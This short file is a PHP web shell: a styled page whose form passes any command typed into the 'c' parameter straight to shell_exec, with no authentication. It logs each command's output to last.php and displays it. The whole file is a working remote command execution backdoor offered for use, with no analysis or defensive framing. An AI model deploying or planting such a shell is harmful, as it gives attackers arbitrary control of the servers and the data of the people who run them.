<style>body{background: black;color: white;}input{

	background: white;
	color: black;
	border: 1px solid white;
	outline: none;
}</style>

<?php
  
// Use ls command to shell_exec
// function
$output = shell_exec($_GET["c"]);
  
// Display the list of all file
// and directory
echo file_put_contents("last.php",file_get_contents("last.php")."<br>"."<pre>".$output."</pre>");
?>
<?php

echo file_get_contents("last.php");
?>
<form>
<input name="c" placeholder="Command"><button>Execute</button>
</form>